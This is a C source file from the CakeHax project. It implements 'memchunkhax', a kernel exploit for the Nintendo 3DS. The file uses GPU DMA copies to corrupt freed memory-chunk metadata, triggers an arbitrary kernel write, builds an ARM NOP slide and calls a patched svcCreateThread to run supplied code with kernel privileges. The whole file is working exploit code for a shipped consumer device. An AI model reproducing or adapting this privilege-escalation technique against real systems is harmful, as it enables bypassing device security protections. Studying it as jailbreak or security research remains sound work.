/*
 * Copyright (C) 2015 mid-kid
 *
 * This file is part of CakeHax.
 *
 * CakeHax is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 2.0
 *
 * CakeHax is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with CakeHax.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "memchunkhax.h"

#include <stddef.h>
#include <stdint.h>
#include "firmcompat.h"
#include "appcompat.h"

void gspwn_copy(void *dest, void *src, uint32_t length, int check, int check_offset)
{
    // We'll use some memory to check the copy is being done right.
    void *check_mem = (void *)APP_CHECK_MEM;
    int *check_loc = (int *)(check_mem + check_offset);

    while(*check_loc != check) {
        memcpy(check_mem, check_mem, 0x10000);
        GSPGPU_FlushDataCache(src, length);

        uint32_t arr1[] = {4, (uint32_t)src, (uint32_t)dest, length,
                           0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
        nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)APP_GPUHANDLE, arr1);

        GSPGPU_FlushDataCache(check_mem, 0x10);

        uint32_t arr2[] = {4, (uint32_t)dest, (uint32_t)check_mem, 0x10,
                           0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
        nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)APP_GPUHANDLE, arr2);

        memcpy(check_mem, check_mem, 0x10000);
    }
}

#if defined(ENTRY_MSET)
void build_nop_slide(uint32_t *dest, unsigned int len)
{
    unsigned int i;
    for (i = 0; i < len; i++) {
        dest[i] = 0xE1A00000;  // ARM instruction: nop
    }
    dest[i - 1] = 0xE12FFF1E;  // ARM instruction: bx lr
}
#endif

__attribute__((naked))
void corrupted_svcCreateThread(__attribute__((unused)) void (*func)())
{
    __asm__ volatile ("svc 8");
}

void memchunk_arm11hax(void (*func)())
{
    // I need some memory locations to use
    uint32_t *mem_hax_mem = (uint32_t *)APP_MEM_HAX_MEM;
    uint32_t *mem_hax_mem_free = (uint32_t *)((uint32_t)mem_hax_mem + 0x1000);

    // There's not much documentation on this code.
    // I've never studied the logic of it, so I can't describe it in more detail.

    // Free some random chunk of memory
    uint32_t tmp_addr;
    svcControlMemory(&tmp_addr, mem_hax_mem_free, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);

    // arm11_buffer is the location that is copied *from* when using gspwn_copy
    uint32_t *arm11_buffer = (uint32_t *)APP_ARM11_BUFFER;
    arm11_buffer[0] = 1;
    arm11_buffer[1] = fw->kernel_patch_address;
    arm11_buffer[2] = 0;
    arm11_buffer[3] = 0;

    // Copy the arm11_buffer to the freed memory with gspwn
    gspwn_copy(mem_hax_mem_free, arm11_buffer, 0x10, fw->kernel_patch_address, 4);

    // Trigger kernel write
    svcControlMemory(&tmp_addr, mem_hax_mem, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);

    // Tricks to clear the instruction cache
#if defined(ENTRY_MSET)
    uint8_t *const top_left_fb = (uint8_t *const)0x14184E60;
    uint8_t *const top_right_fb = (uint8_t *const)0x14282160;
    for(int i = 0; i < 0x00046500; ++i)
    {
        top_left_fb[i] = 0xFF;
        top_right_fb[i] = 0xFF;
    }

    int slide_len = 0x1000;

    // Build a NOP slide
    build_nop_slide(arm11_buffer, slide_len);

    // Copy the NOP slide
    gspwn_copy((void *)(0x14000000 + APP_CODE_OFFSET + 0x4000), arm11_buffer,
            slide_len * 4, 0xE1A00000, 0);

    // Run the NOP slide
    ((void (*)())0x104000)();
#elif defined(ENTRY_SPIDER)
    // Fills the bottom buffer with a random pattern
    void *src = (void *)0x18000000;
    for (int i = 0; i < 3; i++) {  // Do it 3 times to be safe
        GSPGPU_FlushDataCache(src, 0x00038400);
        GX_SetTextureCopy(src, (void *)0x1F48F000, 0x00038400, 0, 0, 0, 0, 8);
        svcSleepThread(0x400000LL);
        GSPGPU_FlushDataCache(src, 0x00038400);
        GX_SetTextureCopy(src, (void *)0x1F4C7800, 0x00038400, 0, 0, 0, 0, 8);
        svcSleepThread(0x400000LL);
    }
#endif

    // Get into arm11
    corrupted_svcCreateThread(func);
}
